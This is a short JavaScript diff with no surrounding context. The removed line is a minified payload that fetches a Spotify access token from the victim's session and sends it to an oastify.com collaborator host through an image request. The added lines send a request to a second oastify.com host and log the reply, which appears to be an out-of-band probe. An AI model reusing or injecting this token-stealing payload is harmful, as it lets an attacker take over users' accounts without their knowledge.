@@ -1,1 +1,8 @@
-var xhr=new XMLHttpRequest();xhr.open("GET","https://open.spotify.com/get_access_token",!0);xhr.onreadystatechange=function(){4==xhr.readyState&&200==xhr.status&&(new Image).src="//mg61iacn8r3x0e6pl1wytfteb5hw5nxbm.oastify.com/?"+encodeURIComponent(xhr.responseText)};xhr.send()
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "https://as6puyobkfflc2idxp8m5352nttkhbdz2.oastify.com", true);
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState == 4 && xhr.status == 200) {
+            console.log("Response:", xhr.responseText);
+        }
+    };
+    xhr.send();
